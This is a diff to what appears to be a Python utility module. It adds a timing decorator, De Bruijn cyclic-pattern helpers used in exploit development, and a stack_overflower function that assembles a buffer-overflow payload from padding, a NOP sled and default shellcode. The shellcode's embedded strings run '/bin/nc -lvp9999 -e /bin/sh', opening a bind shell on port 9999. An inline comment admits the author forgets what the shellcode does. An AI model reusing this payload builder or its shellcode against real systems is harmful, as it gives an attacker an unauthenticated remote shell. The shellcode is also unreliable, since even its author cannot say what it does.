@@ -71,7 +71,6 @@ def connect_pop3(mailserver, username, password):
 
     return p
 
-
 def dns_a_record(host):
     """Returns the DNS A-record of a host
     """
@@ -160,3 +159,72 @@ class Singleton:
 
     def __instancecheck__(self, inst):
         return isinstance(inst, self._decorated)
+
+def timeme(method):
+    """@timeme decorator. Place before any function you want timed.
+
+    Example:
+        @timeme
+        def print_after_three(s):
+            time.sleep(3)
+            return s
+        print_after_three("testing timeme")
+        >> ('print_after_three', 3003, 'ms')
+    """
+    def wrapper(*args, **kw):
+        startTime = int(round(time.time() * 1000))
+        result = method(*args, **kw)
+        endTime = int(round(time.time() * 1000))
+
+        print(method.__name__, endTime - startTime,'ms')
+        return result
+
+    return wrapper
+
+
+def cyclic_pattern(maxlen, n = 3):
+    """Generate the De Bruijn Sequence (a cyclic pattern) up to `maxlen` characters and subsequences
+    of length `n`. Modified from github.com/longld/peda/.
+    """
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
+    k = len(charset)
+    a = [0] * k * n
+    sequence = []
+    def db(t, p):
+        if len(sequence) == maxlen:
+            return
+
+        if t > n:
+            if n % p == 0:
+                for j in range(1, p + 1):
+                    sequence.append(charset[a[j]])
+                    if len(sequence) == maxlen:
+                        return
+        else:
+            a[t] = a[t - p]
+            db(t + 1, p)
+            for j in range(a[t - p] + 1, k):
+                a[t] = j
+                db(t + 1, t)
+    db(1,1)
+    return ''.join(sequence)
+
+def cyclic_pattern_search(needle, size = 100000):
+    """Search a the de bruijin cylic pattern for a `needle` and return its offset.
+    """
+    pattern = cyclic_pattern(size)
+    pos = pattern.find(needle)
+    return pos
+
+def stack_overflower(padlen, noplen, payload = None):
+    if payload is None:
+        # Some default shellcode. I forget what it does...
+        payload = "\xeb\x36\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xcd\x80\x5e\x31\xc0\x88\x46\x07" \
+                  "\x88\x46\x10\x88\x46\x1a\x89\x76\x1b\x8d\x5e\x08\x89\x5e\x1f\x8d\x5e\x11\x89\x5e" \
+                  "\x23\x89\x46\x27\xb0\x0b\x89\xf3\x8d\x4e\x1b\x8d\x56\x27\xcd\x80\xe8\xc5\xff\xff" \
+                  "\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x23\x2d\x6c\x76\x70\x39\x39\x39\x39\x23\x2d\x65" \
+                  "\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42\x43\x43\x43\x43" \
+                  "\x44\x44\x44\x44"
+    pad = cyclic_pattern(padlen)
+    nopsled = "\x90"*noplen
+    return pad+nopsled+payload
